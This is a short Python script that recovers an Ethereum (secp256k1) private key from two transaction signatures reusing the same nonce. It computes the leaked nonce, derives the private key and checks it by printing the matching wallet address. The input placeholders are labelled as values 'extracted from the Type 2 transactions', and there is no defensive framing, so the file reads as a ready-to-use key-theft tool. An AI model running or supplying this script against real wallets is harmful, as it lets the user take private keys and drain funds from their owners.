from eth_keys import keys

# SECP256k1 Curve Order (n)
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def recover_private_key(e1, s1, e2, s2, r):
    # Convert hex strings to integers if necessary
    e1 = int(e1, 16) if isinstance(e1, str) else e1
    s1 = int(s1, 16) if isinstance(s1, str) else s1
    e2 = int(e2, 16) if isinstance(e2, str) else e2
    s2 = int(s2, 16) if isinstance(s2, str) else s2
    r = int(r, 16) if isinstance(r, str) else r

    # 1. Calculate the leaked nonce (k)
    # k = (e1 - e2) / (s1 - s2) mod n
    numerator = (e1 - e2) % N
    denominator = (s1 - s2) % N
    
    # Modular inverse of denominator
    k = (numerator * pow(denominator, -1, N)) % N

    # 2. Calculate the Private Key (d)
    # d = (s1 * k - e1) / r mod n
    d = ((s1 * k - e1) * pow(r, -1, N)) % N

    return hex(d), k

# --- Example Data ---
# Replace these with the values you extracted from the Type 2 transactions
tx1_e = "0x..." 
tx1_s = "0x..."
tx2_e = "0x..."
tx2_s = "0x..."
shared_r = "0x..."

private_key, nonce_k = recover_private_key(tx1_e, tx1_s, tx2_e, tx2_s, shared_r)

print(f"Leaked Nonce (k): {hex(nonce_k)}")
print(f"Recovered Private Key (d): {private_key}")

# Optional: Verify the key
pk = keys.PrivateKey(bytes.fromhex(private_key[2:]))
print(f"Verified Address: {pk.public_key.to_checksum_address()}")